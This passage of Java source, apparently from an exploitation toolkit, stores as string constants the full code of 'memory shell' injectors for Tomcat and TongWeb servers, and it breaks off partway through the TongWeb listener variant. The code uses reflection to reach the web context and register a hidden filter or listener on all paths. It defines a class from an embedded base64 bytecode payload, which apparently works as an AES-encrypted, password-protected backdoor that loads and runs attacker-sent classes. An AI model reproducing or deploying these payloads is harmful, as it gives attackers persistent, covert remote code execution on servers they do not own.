            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static {\n" +
            "        new TomcatFilterMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String TongWebFilterMemShell =
            "import javax.servlet.Filter;\n" +
            "import java.lang.reflect.Constructor;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "import java.util.Iterator;\n" +
            "import java.util.Map;\n" +
            "import java.util.Set;\n" +
            "\n" +
            "public class TongWebFilterMemShell {\n" +
            "    public static Object STANDARD_CONTEXT;\n" +
            "    public static Object RESPONSE;\n" +
            "    public static Object MEMSHELL_OBJECT;\n" +
            "    static String FilterName = \"memshell.TongWebFilterShell\";\n" +
            "\n" +
            "    public TongWebFilterMemShell() {\n" +
            "        try {\n" +
            "            if (STANDARD_CONTEXT == null) {\n" +
            "                getStandardContext();\n" +
            "            }\n" +
            "            if (STANDARD_CONTEXT != null && !isInjected()) {\n" +
            "                injectMemShellClass();\n" +
            "                injectMemShell();\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception var2) {\n" +
            "            var2.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized boolean isInjected() {\n" +
            "        try {\n" +
            "            Map map = (Map) getFV(STANDARD_CONTEXT, \"filterDefs\");\n" +
            "            Set set = map.keySet();\n" +
            "            Iterator it = set.iterator();\n" +
            "            while (it.hasNext()){\n" +
            "                Object o = it.next();\n" +
            "                if (o.toString().contains(FilterName)){\n" +
            "                    return true;\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return false;\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    private static synchronized void injectMemShell() {\n" +
            "        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "\n" +
            "        try {\n" +
            "            Class<?> Context = null;\n" +
            "            try {\n" +
            "                Context = classLoader.loadClass(\"com.tongweb.web.thor.Context\"); //\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "\n" +
            "            Filter filter = (Filter) Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();\n" +
            "            Class<?> FilterDefClass = null;\n" +
            "            try {\n" +
            "                FilterDefClass = classLoader.loadClass(\"com.tongweb.web.thor.deploy.FilterDef\"); //\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();\n" +
            "            FilterDefCons.setAccessible(true);\n" +
            "            Object filterDef = FilterDefCons.newInstance();\n" +
            "            invoke(filterDef, \"setFilterName\", FilterName);\n" +
            "            invoke(filterDef, \"setFilterClass\", filter.getClass().getName());\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterDef\", filterDef);\n" +
            "\n" +
            "            Class<?> filterMapClass = null;\n" +
            "            try {\n" +
            "                filterMapClass = classLoader.loadClass(\"com.tongweb.web.thor.deploy.FilterMap\"); //\n" +
            "            } catch (Exception e) {\n" +
            "\n" +
            "            }\n" +
            "            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();\n" +
            "            FilterMapCons.setAccessible(true);\n" +
            "            Object FilterMapObj = FilterMapCons.newInstance();\n" +
            "            invoke(FilterMapObj, \"addURLPattern\", \"/*\");\n" +
            "            invoke(FilterMapObj, \"setFilterName\", FilterName);\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterMap\", FilterMapObj);\n" +
            "\n" +
            "            Class<?> ApplicationFilterConfigClass = classLoader.loadClass(\"com.tongweb.web.thor.core.ApplicationFilterConfig\");\n" +
            "            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);\n" +
            "            ApplicationFilterCons.setAccessible(true);\n" +
            "            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);\n" +
            "            Map filterConfigs = (Map) getFV(STANDARD_CONTEXT, \"filterConfigs\");\n" +
            "            filterConfigs.put(FilterName, ApplicationfilterObj);\n" +
            "\n" +
            "        } catch (Throwable var16) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {\n" +
            "        Method method = null;\n" +
            "\n" +
            "        while (cs != null) {\n" +
            "            try {\n" +
            "                method = cs.getDeclaredMethod(methodName, parameters);\n" +
            "                cs = null;\n" +
            "            } catch (Exception var6) {\n" +
            "                cs = cs.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return method;\n" +
            "    }\n" +
            "\n" +
            "    private static Object invoke(Object obj, String methodName, Object... parameters) {\n" +
            "        try {\n" +
            "            ArrayList classes = new ArrayList();\n" +
            "            if (parameters != null) {\n" +
            "                for (int i = 0; i < parameters.length; ++i) {\n" +
            "                    Object o1 = parameters[i];\n" +
            "                    if (o1 != null) {\n" +
            "                        classes.add(o1.getClass());\n" +
            "                    } else {\n" +
            "                        classes.add((Object) null);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));\n" +
            "            return method.invoke(obj, parameters);\n" +
            "        } catch (Exception var7) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getStandardContext() throws Exception {\n" +
            "        try {\n" +
            "            int flag = 0;\n" +
            "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Field f1 = threadGroup.getClass().getDeclaredField(\"threads\");\n" +
            "            f1.setAccessible(true);\n" +
            "            Thread[] threads = (Thread[]) f1.get(threadGroup);\n" +
            "\n" +
            "            for (Thread thread : threads) {\n" +
            "                try {\n" +
            "                    char[] chars = (char[]) getFV(thread, \"name\");\n" +
            "                    String name = new String(chars);\n" +
            "                    if (name.contains(\"http-nio\") && name.contains(\"Acceptor\")) {\n" +
            "                        Object target = getFV(thread, \"target\");\n" +
            "                        Object this0 = getFV(target, \"this$0\");\n" +
            "                        Object handler = getFV(this0, \"handler\");\n" +
            "                        Object global = getFV(handler, \"global\");\n" +
            "                        Object processors = getFV(global, \"processors\");\n" +
            "                        Field f7 = processors.getClass().getDeclaredField(\"size\");\n" +
            "                        f7.setAccessible(true);\n" +
            "                        if (!f7.get(processors).toString().equals(\"0\")) {\n" +
            "                            if (flag == 0) {\n" +
            "                                Object[] elementData = (Object[]) getFV(processors, \"elementData\");\n" +
            "                                Object RequestO = getFV(elementData[0], \"req\");\n" +
            "                                RESPONSE = RequestO.getClass().getMethod(\"getResponse\", (Class[]) (new Class[0])).invoke(RequestO);\n" +
            "                                Method m2 = RequestO.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE);\n" +
            "                                m2.setAccessible(true);\n" +
            "                                Object v = m2.invoke(RequestO, 1);\n" +
            "                                try {\n" +
            "                                    STANDARD_CONTEXT = getFV(v, \"context\");\n" +
            "                                } catch (Exception e) {\n" +
            "                                    Method m3 = v.getClass().getSuperclass().getDeclaredMethod(\"getServletContext\");\n" +
            "                                    m3.setAccessible(true);\n" +
            "                                    Object AppContextFacade = m3.invoke(v);\n" +
            "                                    Object AppContext = getFV(AppContextFacade, \"context\");\n" +
            "                                    STANDARD_CONTEXT = getFV(AppContext, \"context\");\n" +
            "                                }\n" +
            "                                flag = 1;\n" +
            "                            }\n" +
            "                        }\n" +
            "                    }\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static void injectMemShellClass() {\n" +
            "        try {\n" +
            "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                String TongListenerBase64 = \"yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAdTG1lbXNoZWxsL1RvbmdXZWJGaWx0ZXJTaGVsbDsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHAPEHAQYHAMUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwDcAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjYBAAJicwEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7BwEHAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAARkYXRhAQAEdmFyOQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEIBwEJAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABdUb25nV2ViRmlsdGVyU2hlbGwuamF2YQwAZgBnDABcAF0MAF4AXwEAEDNjNmUwYjhhOWMxNTIyNGEMAGAAYQEABHBBUzMMAGIAYQEAEC9mYXZpY29uZGVtby5pY28MAGMAYQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEKAQsMAQwBDQwAZACBDABkAGEBAAVVVEYtOAwAZQBhDABmAG0MAQ4BDwEAA0FFUwcBBgwBEAERAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBEgETDABmARQMAJIBFQwBFgEXAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBGAwBEAEZDAEaARsMARwBHQEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAEeARMMAGYBHwwBDAEgDAEhAQ0BABBqYXZhLnV0aWwuQmFzZTY0DAEiASMBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAEkASUBABNbTGphdmEvbGFuZy9PYmplY3Q7BwEmDAEnASgMASkBKgEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAErASwBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEFgtUmVxdWVzdGVkLVdpdGgMAS0AgQEADlhNTEhUVFBSZXF1ZXN0DAEuAS8MATABMQwBMgCBDACPAJAMAHQAdQEAEG1lbXNoZWxsLnBheWxvYWQHAQgMATMBNAEAG21lbXNoZWxsL1RvbmdXZWJGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09i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\";\n" +
            "                byte[] ListenerClass = base64Decode(TongListenerBase64);\n" +
            "                Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "                defineClass1.setAccessible(true);\n" +
            "                Class listenerClass = (Class) defineClass1.invoke(Thread.currentThread().getContextClassLoader(), ListenerClass, 0, ListenerClass.length);\n" +
            "                MEMSHELL_OBJECT = listenerClass.newInstance();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static {\n" +
            "        new TongWebFilterMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String TongWebListenerMemShell =
                "import java.lang.reflect.Field;\n" +
                "import java.lang.reflect.Method;\n" +
                "\n" +
                "public class TongWebListenerMemShell {\n" +
                "\n" +
                "    public static Object STANDARD_CONTEXT;\n" +
                "    public static Object RESPONSE;\n" +
                "    public static Object MEMSHELL_OBJECT;\n" +
                "    static String ListenerName = \"memshell.TongWebListenerShell\";\n" +
                "\n" +
                "    public TongWebListenerMemShell() {\n" +
                "        try {\n" +
                "            if (STANDARD_CONTEXT == null) {\n" +
                "                getStandardContext();\n" +
                "            }\n" +
                "            if (STANDARD_CONTEXT != null && ! isInjected()){\n" +
                "                injectMemShellClass();\n" +
                "                injectMemShell();\n" +
                "            }\n" +
                "\n" +
                "        } catch (Exception var2) {\n" +
                "            var2.printStackTrace();\n" +
                "        }\n" +
                "\n" +
                "    }\n" +
                "\n" +
                "    private static synchronized boolean isInjected(){\n" +
                "        try {\n" +
                "            Object[] o = (Object[]) getFV(STANDARD_CONTEXT, \"applicationEventListenersObjects\");\n" +
                "            for(int i = 0; i < o.length; i ++){\n" +
                "                Object var1 = o[i];\n" +
                "                if (var1 != null && var1.getClass().getName().contains(ListenerName)){\n" +
                "                    return true;\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "        return false;\n" +
                "    }\n" +
                "\n" +
                "\n" +
                "    private static synchronized void injectMemShell() {\n" +
                "        try {\n" +
                "            Method m4 = STANDARD_CONTEXT.getClass().getSuperclass().getDeclaredMethod(\"addApplicationEventListener\", Object.class);\n" +
                "            m4.setAccessible(true);\n" +
                "            m4.invoke(STANDARD_CONTEXT, MEMSHELL_OBJECT);\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "\n" +
                "    }\n" +
                "\n" +
                "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
                "        Field var2 = null;\n" +
                "        Class var3 = var0.getClass();\n" +
                "\n" +
                "        while (var3 != Object.class) {\n" +
                "            try {\n" +
                "                var2 = var3.getDeclaredField(var1);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException var5) {\n" +
                "                var3 = var3.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (var2 == null) {\n" +
                "            throw new NoSuchFieldException(var1);\n" +
                "        } else {\n" +
                "            var2.setAccessible(true);\n" +
                "            return var2.get(var0);\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    public static synchronized void getStandardContext() throws Exception {\n" +
                "        try {\n" +
                "            int flag = 0;\n" +
                "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
                "            Field f1 = threadGroup.getClass().getDeclaredField(\"threads\");\n" +
                "            f1.setAccessible(true);\n" +
                "            Thread[] threads = (Thread[]) f1.get(threadGroup);\n" +
                "\n" +
                "            for (Thread thread : threads) {\n" +
                "                try {\n" +
                "                    char[] chars = (char[]) getFV(thread, \"name\");\n" +
                "                    String name = new String(chars);\n" +
                "                    if (name.contains(\"http-nio\") && name.contains(\"Acceptor\")) {\n" +
                "                        Object target = getFV(thread, \"target\");\n" +
                "                        Object this0 = getFV(target, \"this$0\");\n" +
                "                        Object handler = getFV(this0, \"handler\");\n" +
                "                        Object global = getFV(handler, \"global\");\n" +
                "                        Object processors = getFV(global, \"processors\");\n" +
                "                        Field f7 = processors.getClass().getDeclaredField(\"size\");\n" +
                "                        f7.setAccessible(true);\n" +
                "                        if (!f7.get(processors).toString().equals(\"0\")) {\n" +
